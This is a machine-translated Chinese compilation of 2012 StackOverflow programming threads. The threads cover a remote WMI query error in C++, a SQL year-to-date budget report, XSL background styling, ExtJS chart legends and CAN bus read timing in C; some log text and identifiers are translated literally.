# StackOverflow 问答 13756000-13756999

# c++ - 对 Windows Server 2008 R2 的远程 WMI 调用在第一次尝试 (0x800706BF) 然后在第二次尝试时始终出错

> ID：13756000
> 
> 赞同：3
> 
> 时间：2012-12-07T02:20:21.807
> 
> 标签：c++, wmi, windows-server-2008-r2

我第一次[从 MSDN 运行此示例 C++ 代码](http://msdn.microsoft.com/en-us/library/windows/desktop/aa390422%28v=vs.85%29.aspx)以从远程计算机获取 WMI 数据时，它运行良好。它也适用于与我配置相同的同事：**Windows Server 2008 R2 虚拟机**（域控制器）作为远程机器；**Windows 7 主机**（在不同的域中）作为进行调用的客户端。

但是，在某些时候，代码停止工作。代码简要概述：它提示输入凭据，然后连接到远程服务器，然后使用 WQL 行查询其操作系统信息`Select * from win32_operatingsystem`，然后检索返回的操作系统对象，然后询问表示操作系统名称的对象和表示机器上的可用内存，将此信息打印到控制台。它目前在第一次`IEnumWbemClassObject::Next`调用时出错，应该检索操作系统对象。

我目前正在使用的代码是上面链接的示例代码的略微改编版本。这是完整的 .cpp（删除了一些注释掉的代码块）：

```
#define _WIN32_DCOM
#define UNICODE
#include <iostream>
using namespace std;
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "comsuppw.lib")
#include <wincred.h>
#include <strsafe.h>

// Macro for cleanup (changed to exit to imitate original code more closely)
#define EXIT(x) { ret = x; goto out; }

// Entry point:
int __cdecl main(int argc, char **argv)
{
    HRESULT hres;
    int ret = 0;

    // Initialize COM
    hres = CoInitializeEx(0, COINIT_MULTITHREADED); 
    if (FAILED(hres))
    {
        cout << "Failed to initialize COM library. Error code = 0x" << hex << hres << endl;
        EXIT(1);
    }

    // Set general COM security levels
    hres =  CoInitializeSecurity(
        NULL, 
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IDENTIFY,    // Default Impersonation  
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
        );

    if (FAILED(hres))
    {
        cout << "Failed to initialize security. Error code = 0x" << hex << hres << endl;
        CoUninitialize();
        EXIT(1);
    }

    // Obtain the initial locator to WMI 
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(
        CLSID_WbemLocator,             
        0, 
        CLSCTX_INPROC_SERVER, 
        IID_IWbemLocator, 
        (LPVOID*)&pLoc); 

    if (FAILED(hres))
    {
        cout << "Failed to create IWbemLocator object." << hex << hres << endl;
        CoUninitialize();
        EXIT(1);
    }

    // Connect to WMI through the IWbemLocator::ConnectServer method...
    IWbemServices* pSvc = NULL;

    // First, prompt for the user name and password for the remote computer
    CREDUI_INFO cui;
    bool useToken = false;
    bool useNTLM = true;
    wchar_t pszName[CREDUI_MAX_USERNAME_LENGTH+1] = {0};
    wchar_t pszPwd[CREDUI_MAX_PASSWORD_LENGTH+1] = {0};
    wchar_t pszDomain[CREDUI_MAX_USERNAME_LENGTH+1];
    wchar_t pszUserName[CREDUI_MAX_USERNAME_LENGTH+1];
    wchar_t pszAuthority[CREDUI_MAX_USERNAME_LENGTH+1];
    BOOL fSave;
    DWORD dwErr;

    memset(&cui,0,sizeof(CREDUI_INFO));
    cui.cbSize = sizeof(CREDUI_INFO);
    cui.hwndParent = NULL;

    cui.pszMessageText = TEXT("Press cancel to use process token");
    cui.pszCaptionText = TEXT("Enter Account Information");
    cui.hbmBanner = NULL;
    fSave = FALSE;

    dwErr = CredUIPromptForCredentials( 
        &cui,                             // CREDUI_INFO structure
        TEXT(""),                         // Target for credentials
        NULL,                             // Reserved
        0,                                // Reason
        pszName,                          // User name
        CREDUI_MAX_USERNAME_LENGTH+1,     // Max number for user name
        pszPwd,                           // Password
        CREDUI_MAX_PASSWORD_LENGTH+1,     // Max number for password
        &fSave,                           // State of save check box
        CREDUI_FLAGS_GENERIC_CREDENTIALS |// flags
        CREDUI_FLAGS_ALWAYS_SHOW_UI |
        CREDUI_FLAGS_DO_NOT_PERSIST);  

    if (ERROR_CANCELLED == dwErr)
    {
        useToken = true;
    }
    else if (dwErr)
    {
        cout << "Did not get credentials: " << dwErr << endl;
        pLoc->Release();
        CoUninitialize();
        EXIT(1);  
    }

    if (!useNTLM)
    {
        cout << "not using NTLM" << endl;
        StringCchPrintf(pszAuthority, CREDUI_MAX_USERNAME_LENGTH+1, L"kERBEROS: %s", L"serverdude");
    }

    // Connect to the remote root\cimv2 namespace and obtain pointer pSvc to make IWbemServices calls.
    hres = pLoc->ConnectServer(
        _bstr_t(L"\\\\serverdude\\root\\cimv2"),
        _bstr_t(useToken?NULL:pszName),    // User name
        _bstr_t(useToken?NULL:pszPwd),     // User password
        NULL,                              // Locale             
        NULL,                              // Security flags
        _bstr_t(useNTLM?NULL:pszAuthority),// Authority        
        NULL,                              // Context object
        &pSvc                              // IWbemServices proxy
        );

    if (FAILED(hres))
    {
        cout << "Could not connect. Error code = 0x" << hex << hres << endl;
        pLoc->Release();
        CoUninitialize();
        EXIT(1);
    }
    cout << "Connected to ROOT\\CIMV2 WMI namespace" << endl;

    // Create COAUTHIDENTITY that can be used for setting security on proxy
    COAUTHIDENTITY* userAcct = NULL;
    COAUTHIDENTITY authIdent;

    if (!useToken)
    {
        memset(&authIdent, 0, sizeof(COAUTHIDENTITY));
        authIdent.PasswordLength = wcslen (pszPwd);
        authIdent.Password = (USHORT*)pszPwd;

        LPWSTR slash = wcschr (pszName, L'\\');
        if (NULL == slash)
        {
            cout << "Could not create Auth identity. No domain specified.\n";
            pSvc->Release();
            pLoc->Release();
            CoUninitialize();
            EXIT(1);
        }

        StringCchCopy(pszUserName, CREDUI_MAX_USERNAME_LENGTH+1, slash+1);
        authIdent.User = (USHORT*)pszUserName;
        authIdent.UserLength = wcslen(pszUserName);

        StringCchCopyN(pszDomain, CREDUI_MAX_USERNAME_LENGTH+1, pszName, slash - pszName);
        authIdent.Domain = (USHORT*)pszDomain;
        authIdent.DomainLength = slash - pszName;
        authIdent.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

        userAcct = &authIdent;
    }

    // Set security levels on a WMI connection
    hres = CoSetProxyBlanket(
       pSvc,                           // Indicates the proxy to set
       RPC_C_AUTHN_DEFAULT,            // RPC_C_AUTHN_xxx
       RPC_C_AUTHZ_DEFAULT,            // RPC_C_AUTHZ_xxx
       COLE_DEFAULT_PRINCIPAL,         // Server principal name 
       RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // RPC_C_AUTHN_LEVEL_xxx 
       RPC_C_IMP_LEVEL_IMPERSONATE,    // RPC_C_IMP_LEVEL_xxx
       userAcct,                       // client identity
       EOAC_NONE                       // proxy capabilities 
    );

    if (FAILED(hres))
    {
        cout << "Could not set proxy blanket. Error code = 0x" << hex << hres << endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        EXIT(1);
    }

    // Use the IWbemServices pointer to make requests of WMI...
    // Get the name of the operating system
    IEnumWbemClassObject* pEnum = NULL;
    hres = pSvc->ExecQuery(
        bstr_t("WQL"), 
        bstr_t("Select * from Win32_OperatingSystem"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, 
        NULL,
        &pEnum);

    if (FAILED(hres))
    {
        cout << "Query for operating system name failed." << " Error code = 0x" << hex << hres << endl;
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        EXIT(1);
    }

    // Secure the enumerator proxy
    hres = CoSetProxyBlanket(
        pEnum,                          // Indicates the proxy to set
        RPC_C_AUTHN_DEFAULT,            // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_DEFAULT,            // RPC_C_AUTHZ_xxx
        COLE_DEFAULT_PRINCIPAL,         // Server principal name 
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // RPC_C_AUTHN_LEVEL_xxx 
        RPC_C_IMP_LEVEL_IMPERSONATE,    // RPC_C_IMP_LEVEL_xxx
        userAcct,                       // client identity
        EOAC_NONE                       // proxy capabilities 
        );

    if (FAILED(hres))
    {
        cout << "Could not set proxy blanket on enumerator. Error code = 0x" << hex << hres << endl;
        pEnum->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        EXIT(1);
    }

    // Erase credentials from memory.
    SecureZeroMemory(pszName, sizeof(pszName));
    SecureZeroMemory(pszPwd, sizeof(pszPwd));
    SecureZeroMemory(pszUserName, sizeof(pszUserName));
    SecureZeroMemory(pszDomain, sizeof(pszDomain));

    // Get the data from the OS query
    IWbemClassObject* pclsObj = NULL;
    ULONG uReturn = 0;

    while (pEnum)
    {
        // DEBUG:
        cout << "beginning of loop..." << endl;

        // Get the result of the query
        HRESULT hr = pEnum->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);  

        // DEBUG:
        cout << "IEnumWbemClassObject::Next returned 0x" << hex << hr << endl;

        // PATCH: NOT SURE WHY IT WORKS
        if (0 == uReturn)
        {
            continue;
        }

        // Get the value of the Name property
        VARIANT vtProp;
        hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
        if (FAILED(hr))
        {
            cout << "Could not get OS name. Error code = 0x" << hex << hr << endl;
            EXIT(1);
        }

        // Display OS name info
        wcout << "\tOS Name : " << vtProp.bstrVal << endl;

        // Get the value of the FreePhysicalMemory property
        hr = pclsObj->Get(L"FreePhysicalMemory", 0, &vtProp, 0, 0);
        if (FAILED(hr))
        {
            cout << "Could not get free physical memory. Error code = 0x" << hex << hr << endl;
            EXIT(1);
        }

        // Display free memory info
        wcout << "\tFree physical memory (in kilobytes): " << vtProp.uintVal << endl;

        VariantClear(&vtProp);
        pclsObj->Release();
        pclsObj = NULL;

        // KEEP THIS ONLY IF USING PATCH SOLN
        break;
    }

    // Clean up
    pSvc->Release();
    pLoc->Release();
    pEnum->Release();
    if (pclsObj) 
    { 
        pclsObj->Release(); 
    }
    CoUninitialize(); 

out:
    system("pause");
    return ret;
} 
```

控制台的输出是：

```
连接到 ROOT\CIMV2 WMI 命名空间
循环开始...
IEnumWbemClassObject::Next 返回 0x800706bf
循环开始...
IEnumWbemClassObject::Next 返回 0x0
        操作系统名称：Microsoft Windows Server 2008 R2 Datacenter |C:\Windows|\Device\Harddisk0\Partition1
        可用物理内存（以千字节为单位）：8050116
按任意键继续 。. .

```

代码的唯一重大变化是最后的循环。MSDN 示例不检查错误，而是在`EnumWbemClassObject::Next`将`puReturned`参数设置为 0 时跳出循环（表示请求的 1 个[对象返回 0个对象）。](http://msdn.microsoft.com/en-us/library/windows/desktop/aa390860%28v=vs.85%29.aspx)相反，我显示结果但不对其采取行动，如果`uResult`为 0，则再次尝试循环，并且只有在没有时才跳出循环。这显然是一个 hacky 解决方案，如果代码正常工作，可能会导致无限循环。还值得注意的是，在我尝试循环时，我遇到了其中一个奇怪的访问冲突：程序在某一行抛出异常，但是当我更改*下一行时*线问题消失了。这让我觉得内存损坏可能会发生一些奇怪的事情。

这是更奇怪的部分：当我运行**WBEMtest.exe**（Windows 提供的用于运行本地或远程 WMI 命令的 GUI）时，**我的查询*也*只适用于第二次 try**。就像我的代码一样，它`Error 0x800706bf: The remote procedure call failed and did not execute`在第一次尝试时返回。

出于好奇，我使用事件日志记录了 WMI 活动。我无法从结果中收集到太多信息（除了我的代码和 WBEMtest.exe 之间发生了不同的事情），但无论如何它们都在这里：

*从我的代码运行：*

```
级别 日期和时间 源 事件 ID 任务类别
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6350；操作 ID = 6350；操作 = IWbemServices::Connect; ClientMachine = MSJOHNSON-THINK；用户 = 公司\管理员；ClientProcessId = 26304; 命名空间名称 = \\serverdude\root\cimv2
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6351；操作 ID = 6352；Operation = 启动 IWbemServices::ExecQuery - 从 Win32_OperatingSystem 中选择 *；ClientMachine = MSJOHNSON-THINK；用户 = 公司\管理员；ClientProcessId = 26304; 命名空间名称 = \\.\root\cimv2
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6351；操作 ID = 6353; 操作 = 启动 IWbemServices::ExecQuery - 从 __ClassProviderRegistration 中选择 *；ClientMachine = 本地；用户 = 公司\管理员；ClientProcessId = 0; 命名空间名称 = \\.\root\CIMV2
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6354; Operation = 启动 IWbemServices::GetObject - __Win32Provider.Name=""WmiPerfClass""; ClientMachine =本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6354
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6355; Operation = Start IWbemServices::ExecQuery - {__Win32Provider.Name=""WmiPerfClass"" 的引用}；ClientMachine = 本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 2012 年 12 月 6 日下午 12:22:03 Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6353
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6356; Operation = 启动 IWbemServices::GetObject - __Win32Provider.Name=""CIMWin32""; ClientMachine =本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6356
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6357; Operation = Start IWbemServices::ExecQuery - {__Win32Provider.Name=""CIMWin32"" 的引用}；ClientMachine = 本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6355
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6357
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6358；操作 ID = 6358；操作 = IWbemServices::Connect; ClientMachine = WIN-T53A1FADTFB; 用户 = NT AUTHORITY\网络服务；ClientProcessId = 3000; 命名空间名称 = 根
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6358
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6359; Operation = Start IWbemServices::ExecQuery - {__Win32Provider.Name=""CIMWin32"" 的引用}；ClientMachine = 本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6359
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6351；操作 ID = 6360；操作 = 启动 IWbemServices::GetObject - Win32_OperatingSystem；ClientMachine = 本地；用户 = 公司\管理员；ClientProcessId = 0; 命名空间名称 = \\.\root\CIMV2
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6360
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6361; Operation = 启动 IWbemServices::GetObject - __Win32Provider.Name=""CIMWin32""; ClientMachine =本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6361
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6362; Operation = Start IWbemServices::ExecQuery - {__Win32Provider.Name=""CIMWin32"" 的引用}；ClientMachine = 本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6362
信息 2012 年 12 月 6 日下午 12:22:03 Microsoft-Windows-WMI-Activity 2 无 GroupOperationId = 6351 的 ProviderInfo；操作 = Provider::CreateInstanceEnum - Win32_OperatingSystem; 提供者名称 = CIMWin32；ProviderGuid = {d63a5850-8f16-11cf-9f47-00aa00bf345c}; 路径 = %systemroot%\system32\wbem\cimwin32.dll
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6351；操作 ID = 6363；操作 = 启动 IWbemServices::ExecQuery - 从 Win32_Process 中选择 __RELPATH；ClientMachine = 本地；用户 = 公司\管理员；ClientProcessId = 0; 命名空间名称 = \\.\root\CIMV2
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6364; Operation = 启动 IWbemServices::GetObject - __Win32Provider.Name=""CIMWin32""; ClientMachine =本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 2012 年 12 月 6 日下午 12:22:03 Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6364
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6365; Operation = Start IWbemServices::ExecQuery - {__Win32Provider.Name=""CIMWin32"" 的引用}；ClientMachine = 本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 2012 年 12 月 6 日下午 12:22:03 Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6365
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6351；操作 ID = 6366; 操作 = 启动 IWbemServices::GetObject - Win32_Process；ClientMachine = 本地；用户 = 公司\管理员；ClientProcessId = 0; 命名空间名称 = \\.\root\CIMV2
信息 2012 年 12 月 6 日下午 12:22:03 Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6366
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6367; Operation = 启动 IWbemServices::GetObject - __Win32Provider.Name=""CIMWin32""; ClientMachine =本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6367
信息 12/6/2012 12:22:03 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6351; OperationId = 6368; Operation = Start IWbemServices::ExecQuery - {__Win32Provider.Name=""CIMWin32"" 的引用}；ClientMachine = 本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 =

```

*运行 WBEMtest.exe：*

```
级别 日期和时间 源 事件 ID 任务类别
信息 12/6/2012 12:29:41 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6373；操作 ID = 6373; 操作 = IWbemServices::Connect; ClientMachine = MSJOHNSON-THINK；用户 = 公司\管理员；ClientProcessId = 26004; 命名空间名称 = \\serverdude\root\cimv2
信息 12/6/2012 12:29:52 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6374；操作 ID = 6375; Operation = 启动 IWbemServices::ExecQuery - 从 win32_operatingsystem 中选择 *；ClientMachine = MSJOHNSON-THINK；用户 = 公司\管理员；ClientProcessId = 26004; 命名空间名称 = \\.\root\cimv2
信息 12/6/2012 12:29:52 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6374；操作 ID = 6376; 操作 = 启动 IWbemServices::ExecQuery - 从 __ClassProviderRegistration 中选择 *；ClientMachine = 本地；用户 = 公司\管理员；ClientProcessId = 0; 命名空间名称 = \\.\root\CIMV2
信息 12/6/2012 12:29:52 PM Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6374; OperationId = 6377; Operation = 启动 IWbemServices::GetObject - __Win32Provider.Name=""WmiPerfClass""; ClientMachine =本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 2012 年 12 月 6 日下午 12:29:52 Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6377
信息 2012 年 12 月 6 日下午 12:29:52 Microsoft-Windows-WMI-Activity 1 无 "GroupOperationId = 6374; OperationId = 6378; Operation = Start IWbemServices::ExecQuery - {__Win32Provider.Name=""WmiPerfClass"" 的引用}；ClientMachine = 本地；用户 = CORP\Administrator；ClientProcessId = 0；命名空间名称 = \\.\root\CIMV2"
信息 2012 年 12 月 6 日下午 12:29:52 Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6376
信息 2012 年 12 月 6 日下午 12:29:52 Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6378
信息 12/6/2012 12:29:52 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6374；操作 ID = 6379; 操作 = 启动 IWbemServices::GetObject - win32_operatingsystem；ClientMachine = 本地；用户 = 公司\管理员；ClientProcessId = 0; 命名空间名称 = \\.\root\CIMV2
信息 12/6/2012 12:29:52 PM Microsoft-Windows-WMI-Activity 3 无停止 OperationId = 6379
信息 2012 年 12 月 6 日下午 12:29:52 Microsoft-Windows-WMI-Activity 2 无 GroupOperationId = 6374 的 ProviderInfo；操作 = Provider::CreateInstanceEnum - Win32_OperatingSystem; 提供者名称 = CIMWin32；ProviderGuid = {d63a5850-8f16-11cf-9f47-00aa00bf345c}; 路径 = %systemroot%\system32\wbem\cimwin32.dll
信息 12/6/2012 12:29:52 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6374；操作 ID = 6380；操作 = 启动 IWbemServices::ExecQuery - 从 Win32_Process 中选择 __RELPATH；ClientMachine = 本地；用户 = 公司\管理员；ClientProcessId = 0; 命名空间名称 = \\.\root\CIMV2
信息 12/6/2012 12:29:52 PM Microsoft-Windows-WMI-Activity 1 无 GroupOperationId = 6374；操作 ID = 6381；操作 = 启动 IWbemServices::GetObject - Win32_Process；ClientMachine = 本地；用户

```

所以，是的，我完全失去了。谁能弄清楚发生了什么？我已经看到其他人在类似情况下看到机器之间的 WMI 行为不一致的报告（例如，这里称为*Win32_BaseBoard 的 WMI 查询的问题没有返回结果*——由于新用户的最大超链接为两个超链接，因此无法链接），但我从未见过令人满意的解释。顺便说一句，我从一个新的虚拟机开始，仍然遇到这个问题（尽管每隔一段时间 WBEMtest.exe 在第一次尝试时没有出错）。

# sql - 涉及 3 个表的 SQL 年初至今报告

> ID：13756006
> 
> 赞同：0
> 
> 时间：2012-12-07T02:20:47.650
> 
> 标签：sql, sql-server-2008, tsql, reporting

我正在尝试创建一个年初至今的报告，其中列出了所有客户以及自年初以来当前日期的所有发票的总数。我还想从预算表中加入相同的总列，以便他们能够比较实际与预算。我能够将客户加入发票并正确获得他们的总数，但是当我加入预算表时我无法获得正确的值。

tbl_Clients
- ID 唯一标识符
- 名称 varchar(100)
- isActive 位
- isDeleted 位

tbl_Invoices
-ClientID uniqueidentifier
-Month int -Year
int
-Energy int
-Demand int
-DemandDollar decimal(18,2)
-EnergyDollar decimal(18,2)
-IsActive bit
-IsDeleted bit

tbl_Budgets
-ClientID uniqueidentifier
-Month int -Year
int
-Energy int
-Demand int
-DemandDollar decimal(18,2)
-EnergyDollar decimal(18,2)
-IsActive bit
-IsDeleted bit

此过程当前用于从 tbl_Invoices 获取每个客户的总数。我只是不确定如何将 tbl_Budgets 表总计添加为 5 列。预算表中的 Mills 列以相同的方式计算。

这是我目前使用的静态值 2012 和 9（9 月）的过程它们最终将成为存储过程中的参数。

```
Select cli.name
    , Sum(inv.DemandDollar) as DemandDollar
    , SUM(inv.EnergyDollar) as EnergyDollar
    , Sum(inv.Energy) as Energy
    , Sum(inv.Demand) as Demand
    , Mills = 
        (
        case when sum(inv.Energy) = 0
        then 0.00
        else
        Cast((((sum(inv.DemandDollar) + sum(inv.EnergyDollar))/sum(inv.Energy))* 1000) as decimal(18,2))
        end 
        )

from tbl_Clients cli
join tbl_Invoices inv
on inv.ClientID = cli.ID

where cli.IsActive = 1 and cli.IsDeleted = 0 
and inv.IsActive = 1 
and inv.IsDeleted = 0 and inv.Year = 2012 and inv.Month <= 9 
group by cli.name 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T02:42:31.457

您需要问自己的第一件事是，没有发票的客户是否可以有预算，是否需要包括在内？另外，没有预算的客户可以有发票吗？是否每个有发票的客户都有预算，是否每个有预算的客户都有发票？这些问题的答案将影响您构建查询的方式。

所以也许这个，它拿起所有的预算和发票，不管：

```
SELECT cli.Name, SUM(UsedDollar) AS UsedDollar, SUM(BudgetDollar) AS BudgetDollar
(SELECT ClientID, EnergyDollar AS UsedDollar, 0.0 AS BudgetDollar
FROM tbl_Invoices
WHERE Year = 2012 AND Month <= 9
UNION ALL
SELECT ClientID, 0.0 AS UsedDollar, EnergyDollar AS BudgetDollar
FROM tbl_Budgets
WHERE Year = 2012 AND Month <= 9
) DT 
INNER JOIN tbl_Clients cli ON DT.ClientID = cli.ID
GROUP BY cli.Name 
```

# html - 添加背景并将其居中而不重复

> ID：13756010
> 
> 赞同：0
> 
> 时间：2012-12-07T02:21:06.683
> 
> 标签：html, css, xml, image

我正在尝试插入背景图像并拥有它，以便它不会重复自身并且图像居中。这是我使用的 XSL 编码：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/countries">
<html>
<body background ="bg_locale.jpg">
<font color="white">
    <xsl:for-each select="country">

    <xsl:value-of select="countryname"/><br/>

    </xsl:for-each>
</font>
</body>
</html>

</xsl:template>

</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T02:43:11.153

看起来您正在 XSL 模板中编写 HTML。有很多方法可以完成你想做的事情，这里是最简单的：

您可以尝试使用“样式”属性，而不是使用 HTML“背景”元素。最终，您会希望将这些样式信息与内容分开，但我想这将在课程的稍后部分出现：) style 属性接受一种称为 CSS（层叠样式表）的语法。不要太深入，请尝试以下方法：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/countries">
<html>
<body style="background: url('bg_locale.jpg') no-repeat center center">
<font color="white">
    <xsl:for-each select="country">

    <xsl:value-of select="countryname"/><br/>

    </xsl:for-each>
</font>
</body>
</html>

</xsl:template>
</xsl:stylesheet> 
```

您可以在此处找到有关 CSS 背景的更多信息：http: [//www.w3schools.com/css/css_background.asp](http://www.w3schools.com/css/css_background.asp)

# javascript - ExtJS 图表 - 打开和关闭列

> ID：13756011
> 
> 赞同：0
> 
> 时间：2012-12-07T02:21:07.627
> 
> 标签：javascript, extjs4, extjs4.1

我对 ExtJS 图表有点困惑。

我创建了一个柱形图，它的数据看起来像这样

```
[
    {'name':'Stu', 'score':10},
    {'name':'Jack', 'score':50},
    {'name':'Lily', 'score':100}
] 
```

我让它在图表中工作，但我希望能够关闭每一列。我可以显示图例，但它将所有数据作为一个数据集（我猜这是有道理的）。

如何使每列作为单独的项目出现在图例中？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T13:09:28.833

您将无法在简单的条形图或柱形图中执行此操作

要走的路是组图

这里我给你一个示例代码，你自己运行看看，希望对你有帮助

```
 Ext.onReady(function() {
Ext.define('testModel', {
    extend: 'Ext.data.Model',
    fields: [
        {name: 'label', type: 'string'},
        {name: 'Tom',   type: 'int'},
        {name: 'Bob',   type: 'int'},
        {name: 'Steve', type: 'int'},
        {name: 'Eric',  type: 'int'},
        {name: 'Ed',    type: 'int'},
    ]
});

var store = Ext.create('Ext.data.Store', {
    model: 'testModel',
    data: [{
        'label':'Friends',
        'Tom':   '5',
        'Bob':   '7',
        'Steve': '8',
        'Eric':  '9',
        'Ed':    '8'
    }]
});

Ext.create('Ext.panel.Panel', {
    height: 400,
    width: 500,
    frame: true,
    renderTo: Ext.getBody(),
    items: [{
        height: 400,
        width: 500,
        xtype: 'chart',
        store: store,
        legend: {
            position: 'right'
        },
        axes: [{
            type: 'Category',
            position: 'left',
            fields: 'label',
            title: 'Friends'
        }, {
            type: 'Numeric',
            position: 'bottom',
            fields: ['Tom', 'Bob', 'Steve', 'Eric', 'Ed'],
            title: 'Hours of Sleep',
            grid: true,
            minimum: 0
        }],
        series: [{
            showInLegend: true,
            type: 'bar',
            axis: 'bottom',
            xField: 'label',
            yField: ['Tom', 'Bob', 'Steve', 'Eric', 'Ed'],
        }]
    }]
});
    }); 
```

# c - 计算 CAN 总线速度

> ID：13756012
> 
> 赞同：0
> 
> 时间：2012-12-07T02:21:16.760
> 
> 标签：c

我需要为我们的产品验证和表征 CAN 总线流量（称之为被测单元，UUT）。我有一台机器可以向我们的产品发送指定数量的罐头框架。我们的产品运行基于 Linux 的自定义内核。CAN 帧是使用特定算法在发送器机器上预先构建在软件中的。UUT 使用该算法来验证接收到的帧。另外，这就是我的问题所在，我正在尝试在 UUT 软件中计算一些时序数据。所以我基本上尽可能快地进行读取循环。我有一个预先分配的缓冲区来存储帧，所以我只需调用 read 并增加指向缓冲区的指针：

```
 clock_gettime(clocK_PROCESS_CPUTIME_ID,  timespec_start_ptr);
    while ((frames_left--) > 0)
        read(can_sock_fd, frame_mem_ptr++, sizeof(struct can_frame));  

    clock_gettime(CLOCK_PROCESS_CPUTIME_ID,  timespec_stop_ptr); 
```

